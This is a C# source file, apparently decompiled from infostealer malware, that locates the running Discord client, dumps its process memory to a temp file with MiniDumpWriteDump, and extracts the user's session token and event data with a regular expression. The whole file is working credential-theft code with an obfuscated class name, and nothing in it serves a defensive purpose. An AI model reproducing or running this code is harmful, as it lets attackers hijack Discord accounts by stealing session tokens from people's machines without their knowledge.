using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public static class fffsa
	{
		private static Regex regex = new Regex("({\"token\":\"(.*)}}]})", RegexOptions.Compiled);

		[DllImport("DbgHelp.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

		public static DiscordSession TempGet()
		{
			try
			{
				Process process = FindDisordProcess();
				if (process != null)
				{
					string text = DumpProcess(process);
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = FindDiscordJsonSession(text);
						if (!string.IsNullOrEmpty(text2))
						{
							JsonValue jsonValue = text2.FromJSON();
							DiscordSession discordSession = new DiscordSession();
							discordSession.token = jsonValue["token"].ToString(saving: false);
							discordSession.events = new List<Event>();
							foreach (JsonValue item in (IEnumerable)jsonValue["events"])
							{
								Event @event = new Event
								{
									type = item["type"].ToString(saving: false)
								};
								foreach (JsonValue item2 in (IEnumerable)item["properties"])
								{
									@event.properties = new Properties();
									@event.properties.client_send_timestamp = item2["client_send_timestamp"].ToString(saving: false);
									@event.properties.client_track_timestamp = item2["client_track_timestamp"].ToString(saving: false);
									@event.properties.client_uuid = item2["client_uuid"].ToString(saving: false);
									@event.properties.num_users_visible = Convert.ToInt32(item2["num_users_visible"].ToString(saving: false));
									@event.properties.num_users_visible_with_mobile_indicator = Convert.ToInt32(item2["num_users_visible_with_mobile_indicator"].ToString(saving: false));
								}
								discordSession.events.Add(@event);
							}
							return discordSession;
						}
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}

		private static string FindDiscordJsonSession(string data)
		{
			try
			{
				IEnumerator enumerator = regex.Matches(data).GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						return ((Match)enumerator.Current).Value;
					}
				}
				finally
				{
					IDisposable disposable = enumerator as IDisposable;
					if (disposable != null)
					{
						disposable.Dispose();
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return string.Empty;
		}

		private static string DumpProcess(Process process)
		{
			string empty = string.Empty;
			try
			{
				string path = Environment.ExpandEnvironmentVariables(Path.Combine("%temp%", "discord.dmp"));
				bool flag = false;
				using (FileStream fileStream = File.Open(path, FileMode.Create, FileAccess.Write))
				{
					flag = MiniDumpWriteDump(process.Handle, process.Id, fileStream.SafeFileHandle.DangerousGetHandle(), 2u, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				}
				if (flag)
				{
					return File.ReadAllText(path);
				}
				return empty;
			}
			catch
			{
				return empty;
			}
		}

		private static Process FindDisordProcess()
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Discord");
				foreach (Process process in processesByName)
				{
					if (ClientInfoHelper.GetCommandLine(process).Trim() == "\"" + process.MainModule.FileName + "\"")
					{
						return process;
					}
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return null;
		}
	}
}
